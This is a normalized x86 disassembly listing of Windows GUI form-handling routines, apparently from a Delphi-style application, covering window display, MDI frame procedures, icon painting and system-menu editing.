pop esi
pop ebx
retn
test esi esi
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
cmp esi 0x24
jl r-xdata
mov [ ebx + 0x25c ] esi
cmp [ ebx + 0x25c ] 0x0
je r-xdata
sub_4549b8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4549ac
cmp bl al
je r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x25c ] eax
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ esi + 0x25c ] eax
sub_454a24
push ebx
mov ebx eax
mov eax ebx
call sub_440370
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x70 ] 0xff00000f
jne r-xdata
mov eax ebx
call sub_454a0c
cmp eax [ ebx + 0x70 ]
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_454a0c
mov edx eax
mov eax ebx
call sub_43a710
mov edx 0xff00000f
mov eax ebx
call sub_43a710
pop ebx
retn
sub_454aa8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22b ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x22b ] bl
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x1a6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
push eax
mov eax esi
call sub_440d58
push eax
call ShowWindow
sub_454ae8
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx eax
mov al [ ebx + 0x231 ]
test al al
je r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ rw-data ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
xor edx edx
mov [ esp ] edx
cmp al 0x2
jne r-xdata
mov al [ ebx + 0x231 ]
cmp al 0x3
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_454500
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
cmp al 0x1
jne r-xdata
mov edx [ rw-data ]
cmp [ edx + 0x68 ] 0x0
je r-xdata
mov eax ebx
call sub_454500
mov eax [ eax + 0x4 ]
mov [ esp + 0x4 ] eax
mov eax [ rw-data ]
call sub_457f74
dec eax
test eax eax
jl r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_457f60
mov eax [ eax + 0x4 ]
mov [ esp ] eax
mov eax [ rw-data ]
mov eax [ eax + 0x68 ]
call sub_454500
mov eax [ eax + 0x4 ]
mov [ esp ] eax
jmp r-xdata
inc eax
mov [ esp + 0x10 ] eax
xor esi esi
inc esi
dec [ esp + 0x10 ]
jne r-xdata
mov eax [ esp ]
cmp eax [ esp + 0x4 ]
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_457f60
mov eax [ eax + 0x4 ]
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_457f74
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
mov [ esp + 0x8 ] 0x0
inc [ esp + 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x230 ]
cmp al 0x4
jne r-xdata
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_457f60
mov eax [ eax + 0x4 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
cmp al 0x6
jne r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c64
push eax
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c48
sub eax ebp
sar eax 0x1
jns r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c30
mov ebp eax
add ebp [ ebx + 0x40 ]
mov edx [ esp + 0x8 ]
mov eax [ rw-data ]
call sub_457f60
call sub_457c30
sub ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c30
push eax
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c7c
pop edx
add edx eax
mov eax [ ebx + 0x48 ]
add eax ebp
cmp edx eax
jge r-xdata
mov eax [ ebx + 0x48 ]
push eax
mov ebp [ ebx + 0x4c ]
push ebp
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c64
push eax
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c48
sub eax ebp
sar eax 0x1
jns r-xdata
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c30
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c7c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c64
add eax [ ebx + 0x44 ]
push eax
mov edx [ esp + 0xc ]
mov eax [ rw-data ]
call sub_457f60
call sub_457c64
pop edx
sub edx eax
mov [ esp + 0xc ] edx
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c64
push eax
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c48
pop edx
add edx eax
mov eax [ esp + 0xc ]
add eax [ ebx + 0x4c ]
cmp edx eax
jge r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c30
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c7c
add ebp eax
sub ebp [ ebx + 0x48 ]
pop edx
add edx eax
push edx
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c30
mov ebp eax
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c7c
sub eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
adc eax 0x0
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
mov ecx [ esp + 0x14 ]
mov edx ebp
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x84 ]
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c64
push eax
mov edx esi
mov eax [ rw-data ]
call sub_457f60
call sub_457c48
pop edx
add edx eax
sub edx [ ebx + 0x4c ]
mov [ esp + 0xc ] edx
add ebp eax
mov edx ebp
mov eax ebx
pop ecx
mov ebp [ eax ]
call [ ebp + 0x84 ]
jmp r-xdata
adc eax 0x0
sub_454e3c
push ebx
push esi
push edi
push ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_4523f0
mov edx esi
mov eax edi
call sub_4577e0
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov [ esi + 0x24 ] 0x8
test [ edi + 0x1c ] 0x10
je r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov al [ edi + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ edi + 0x30 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x1c ] eax
and [ esi + 0x4 ] 0xbffcffff
mov bl [ edi + 0x228 ]
mov al [ edi + 0x229 ]
mov [ esp ] al
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x80000000
mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_454eeb ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43db7c
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_43db7c
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_45504d
add [ eax ] al
add [ ecx ] cl
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_452400
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_440d58
push eax
call SendMessageA
mov eax ebx
call sub_4559ac
push eax
push 0x1
push 0x80
mov eax ebx
call sub_440d58
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_439f74
push eax
mov eax ebx
call sub_439fb8
push eax
mov eax ebx
call sub_440d58
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406a28
mov [ ebx + 0x254 ] eax
push ebx
push sub_453f98
call sub_41aae0
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_44ad38
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_440d58
push eax
call SetWindowPos
jmp r-xdata
sub_45519a
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4552c5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_43dee0
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_4576b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4552cc
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_4552d4
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_43e14c
push 0x0
mov eax ebx
call sub_440d58
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_455318
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43e8d0
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_440d58
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_440d58
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_45537c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_455424
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45542b
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
mov eax edi
call sub_451710
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403394
mov eax ebx
call sub_455734
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403394
test al al
jne r-xdata
sub_455434
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_43d834
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_43d834
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_45537c
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_45547c
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_45537c
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_4554a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_4141dc
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_414114
mov eax edi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_4141dc
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_414114
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_455710
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_440d58
mov dx 0xb000
call sub_4514d8
test al al
jne r-xdata
call sub_440d58
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_4514d8
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455717
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_4039d0
jmp r-xdata
call sub_4039d0
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_43d834
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_440d58
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_4514d8
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_43b724
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
call sub_4039d0
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_440d58
mov dx 0xb01a
call sub_4514d8
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_4039d0
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_43b724
sub_455734
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_43b724
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_440d58
push eax
call SetFocus
mov eax ebx
call sub_440d58
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_455784
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_43b724
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_455838
mov eax esi
call sub_455734
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_441180
mov edx eax
mov eax esi
call sub_45537c
sub_4557e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_454400
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_43b724
mov eax ebx
call sub_454400
mov edx esi
call sub_4557e8
sub_455838
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_44e864
mov edx esi
call sub_44e848
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_4558e0
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_440d58
push eax
call SendMessageA
sub_45592c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_4558e0
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_45595c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_4558e0
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_4559c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41da6c
xor eax eax
push ebp
push sub_455a76
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_41dde0
xor eax eax
push ebp
push sub_455a53
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403394
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_455a5a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_41dde0
retn
sub_455a84
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_454400
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_454434
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403394
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_440020
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_454480
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403394
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_455b24
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_440d58
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_440d58
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_4559ac
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_440d58
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_43eee8
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_455ba2
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41d64c
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_455c04
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_440d58
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_43f1ac
pop edi
pop esi
retn
sub_455c50
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440d58
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_455d4c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_454774
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_455c50
pop ecx
sub_455d80
push ebx
push esi
mov esi edx
